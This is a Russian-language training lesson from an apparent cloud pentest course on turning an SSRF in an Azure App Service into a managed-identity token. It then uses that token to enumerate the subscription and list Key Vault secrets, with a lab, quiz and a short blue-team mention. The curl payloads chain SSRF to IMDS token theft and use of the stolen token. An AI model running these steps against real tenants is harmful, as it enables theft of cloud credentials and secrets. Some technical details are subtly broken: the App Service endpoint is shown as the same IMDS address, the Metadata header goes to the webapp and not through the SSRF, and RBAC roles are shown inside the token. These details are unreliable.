---
id: cloud-azure-managed-identity
title: "Azure Managed Identity и IMDS: от SSRF до токена ресурса"
category: cloud
parent: cloud-metadata-ssrf
difficulty: expert
order: 1
tags: [cloud, azure, managed-identity, imds, ssrf, token, entra-id]
prerequisites: [cloud-azure-basics, cloud-metadata-ssrf]
useful_for:
  - "Эксплуатация SSRF/RCE на Azure-ресурсах"
  - "Захват managed identity и последующая эскалация"
  - "Пентест App Service, Functions, AKS, VM"
estimated_minutes: 35
summary: "Как устроен endpoint managed identity в Azure, чем отличается IMDS от IMDSv2 в AWS, и как через SSRF/RCE получить токен, определить его права и пройти в Key Vault, ARM и Graph."
lab:
  kind: shell
  title: "Практика: Azure IMDS — токен managed identity и теги инстанса"
  toolset: [core, curl]
  workdir: /home/student/azmi
  files: [task.md, notes.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "IMDS Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (заголовок Metadata: true)."
    - "Токен managed identity: `.../metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01`."
    - "Флаг спрятан в тегах инстанса. Сохрани instance metadata и найди его: `grep nto inst.json > found.txt`."

---

## Вопрос, с которого всё начинается

В AWS metadata отдаёт **постоянные ключи** роли. В Azure всё иначе: оттуда приходит **токен** — и его ещё нужно правильно попросить, указав, к какому сервису ты хочешь доступ. Разберёмся, как это работает, на примере приложения в Azure App Service.

Managed Identity — это «встроенная учётная запись» Azure-ресурса. Ресурс (ВМ, App Service, функция) может иметь такую identity, и тогда он получает права, не храня паролей.

## Наш пример: приложение с managed identity

Объект урока — приложение `webapp-prod.azurewebsites.net`, у которого включена managed identity. Допустим, у него есть SSRF в параметре `image`. Проверим, отдаёт ли что-то Azure metadata.

## Шаг 1: узнаём адрес и обязательный заголовок

У Azure два «входа» в metadata:

- `169.254.169.254` — IMDS (как в AWS), для ВМ и подов.
- `169.254.169.254` или переменная окружения `IDENTITY_ENDPOINT` — для App Service и Functions.

В обоих случаях **обязателен заголовок** `Metadata: true`. Без него Azure откажет. Пробуем:

```
$ curl -s "https://webapp-prod.azurewebsites.net/fetch?image=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

Если SSRF не даёт задать заголовок — не сработает. Но часто приложение следует редиректам или принимает заголовки, и тогда:

```
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "expires_on": "1714580000",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

Мы получили **токен** на ресурс `https://management.azure.com/` — это API управления Azure (ARM). Внутри токена зашиты права identity.

## Шаг 2: читаем токен

Токен — это JWT: три части base64, разделённые точками. Полезные данные лежат в средней части. Посмотрим их:

```
$ python3 -c "import base64,json,sys; p='eyJ0eXAiOi...'.split('.')[1]; print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'='*(-len(p)%4))), indent=2))"
{
  "aud": "https://management.azure.com/",
  "iss": "https://sts.windows.net/72f988bf-.../",
  "appid": "c3f1d2e4-...",
  "oid": "8a7b6c5d-...",
  "roles": ["Contributor"]
}
```

Читаем: токен выдан для приложения `appid`, а поле `roles` показывает роль — `Contributor`. В Azure роль назначается на уровне **scope**: вся подписка, resource group или отдельный ресурс. `Contributor` на подписке — это почти полный контроль над ресурсами.

## Шаг 3: используем токен

С этим токеном обращаемся к API Azure. Например, перечислим ресурсы подписки:

```
$ curl -s -H "Authorization: Bearer eyJ0eXAiOiJKV1Qi..." \
    "https://management.azure.com/subscriptions?api-version=2020-01-01"
{
  "value": [
    { "id": "/subscriptions/11111111-...", "displayName": "Production" }
  ]
}
```

Мы видим подписку `Production`. Дальше можно читать секреты из Key Vault, если у identity есть на это права:

```
$ curl -s -H "Authorization: Bearer eyJ0eXAiOi..." \
    "https://vault-prod.vault.azure.net/secrets?api-version=7.4"
{"value":[{"id":"https://vault-prod.vault.azure.net/secrets/db-password"}]}
```

Одна SSRF-ошибка превратилась в доступ к секретам продакшена.

## Шаг 4: если токен нужен на другой ресурс

Ключевая особенность Azure: в запросе ты сам указываешь `resource`. Тот же endpoint выдаст токен и для Graph, и для хранилища, если у identity есть права:

| resource | Что открывает |
|----------|---------------|
| `https://management.azure.com/` | ARM: управление ресурсами |
| `https://graph.microsoft.com/` | Microsoft Graph: пользователи, почта, каталог |
| `https://vault.azure.net` | Key Vault: секреты и ключи |
| `https://storage.azure.com/` | Storage: блобы и файлы |

Поэтому, получив доступ к metadata, перебирай `resource` — так находишь, куда identity пускают.

## Шаг 5: IMDS-варианты и отличия от AWS

Сравним «большую тройку», чтобы не путаться:

| Провайдер | Адрес | Обязательный заголовок | Что отдаёт |
|-----------|-------|------------------------|------------|
| AWS IMDSv1 | `169.254.169.254/latest/meta-data/...` | нет | постоянные ключи роли |
| AWS IMDSv2 | тот же | токен через PUT | ключи роли |
| Azure | `169.254.169.254/metadata/identity/oauth2/token` | `Metadata: true` | токен на выбранный resource |
| GCP | `169.254.169.254/computeMetadata/v1/...` | `Metadata-Flavor: Google` | токен/креды сервисного аккаунта |

Azure и GCP требуют заголовок — значит, SSRF «только GET без заголовков» их не берёт. Но как только ты можешь влиять на заголовки (или у тебя RCE), защита перестаёт помогать.

## Шаг 6: system-assigned и user-assigned identity

У Azure есть два вида managed identity:

- **System-assigned** — создаётся вместе с ресурсом и удаляется вместе с ним, привязана ровно к одному ресурсу.
- **User-assigned** — отдельный объект, который можно назначить нескольким ресурсам сразу.

Для атакующего разница практическая: user-assigned identity может иметь те же права на нескольких машинах, и, захватив её на одной, ты повторишь доступ на других. В токене identity видна по полям `appid`/`oid` — по ним её находят в каталоге:

```
$ az ad sp show --id c3f1d2e4-... --query "{name:displayName}"
{"name": "webapp-prod-identity"}
```

Имя подсказывает назначение identity: `webapp-prod-identity` явно привязана к продакшену — значит, права у неё, скорее всего, широкие.

## Шаг 7: чем Azure-токен отличается от AWS-ключей

В AWS ты получаешь **пару ключей**, которой подписываешь каждый запрос. В Azure ты получаешь **токен** и просто подставляешь его в заголовок:

```
Authorization: Bearer eyJ0eXAiOiJKV1Qi...
```

Из этого следуют две вещи. Первая: токен живёт ограниченное время (`expires_on`), после чего его нужно получить заново. Вторая: токен выдан на конкретный `resource` — на ARM он не подойдёт для Graph, и наоборот. Поэтому при эксплуатации перебирай `resource`, пока не найдёшь тот, где у identity есть права.

## Практический совет

Перебирай параметр `resource`: одна identity может открывать и ARM, и Graph, и Key Vault.

## Частые вопросы

**«Чем Azure-токен отличается от AWS-ключей?»** AWS отдаёт пару ключей, которой подписывают запросы. Azure отдаёт токен с ограниченным сроком, который просто подставляют в заголовок.

**«Почему нужен параметр resource?»** Токен выдан на конкретный сервис (ARM, Graph, Key Vault). С одним ресурсом ты не получишь другой — их надо перебирать.

**«Обязателен ли заголовок Metadata?»** Да, без него Azure откажет. Именно поэтому простой SSRF без контроля заголовков Azure не берёт.

**«Где искать identity у App Service?»** В переменных окружения (`IDENTITY_ENDPOINT`, `IDENTITY_HEADER`) и через тот же metadata-адрес.

## Что мы теперь знаем

По-простому:

1. Managed identity — встроенная учётка Azure-ресурса без паролей.
2. Токен identity выдаётся через metadata, но **обязателен заголовок** `Metadata: true`.
3. В запросе указывается `resource` — ARM, Graph, Key Vault, Storage.
4. Внутри токена (JWT) видны `appid`, `oid` и роли.
5. Получив токен, можно читать секреты и управлять ресурсами.

## На что смотреть дальше

- **Пробуй разные `resource`.** Одна identity может пускать и в ARM, и в Graph.
- **Читай роли в токене.** `roles: [Contributor]` сразу говорит о масштабе доступа.
- **Помни про срок.** `expires_on` ограничивает окно.
- **Проверяй Key Vault.** Секреты там — самый прямой приз.

## Квиз

Проверь себя.

```quiz
- question: "Какой заголовок обязателен для Azure metadata?"
  options:
    - "Metadata: true"
    - "Metadata-Flavor: Google"
    - "X-aws-token"
    - "Authorization: Basic"
  answer: 0
  explanation: "Azure отклоняет запросы без заголовка Metadata: true."
- question: "Что указывают в запросе к Azure metadata, чтобы получить нужный токен?"
  options:
    - "resource"
    - "role"
    - "region"
    - "account"
  answer: 0
  explanation: "Параметр resource определяет, к какому сервису выдан токен."
- question: "Что такое managed identity?"
  options:
    - "Встроенная учётная запись Azure-ресурса без паролей"
    - "Пользователь каталога"
    - "Группа безопасности"
    - "Правило firewall"
  answer: 0
  explanation: "Identity выдаётся ресурсу и работает через токены."
- question: "Где в JWT-токене указаны роли identity?"
  options:
    - "В первой части (header)"
    - "В полезной нагрузке (payload), поле roles"
    - "В подписи"
    - "Только в Key Vault"
  answer: 1
  explanation: "Payload содержит appid, oid и roles."
- question: "Чем Azure metadata отличается от AWS IMDSv1?"
  options:
    - "Azure отдаёт токен и требует заголовок, AWS — ключи без заголовка"
    - "Они полностью одинаковы"
    - "Azure не связан с ролями"
    - "AWS требует resource"
  answer: 0
  explanation: "Azure выдаёт токен на ресурс и требует Metadata: true."
```

## Куда дальше

Мы умеем получать токен из Azure. В следующем уроке мы соберём **сквозные цепочки SSRF** сразу для AWS, Azure и GCP: как на одном входе определить провайдера и добраться до роли в каждом случае. А пока запомни главное: managed identity отдаёт токен только с правильным заголовком — и этот токен открывает целую подписку.

## Где пригодится

- **CTF (Cloud):** Azure-задачи с metadata и Key Vault.
- **Bug bounty:** SSRF в Azure-приложениях.
- **Пентест:** аудит managed identity и назначенных ролей.
- **Blue team:** принцип наименьших привилегий для identity и защита metadata.
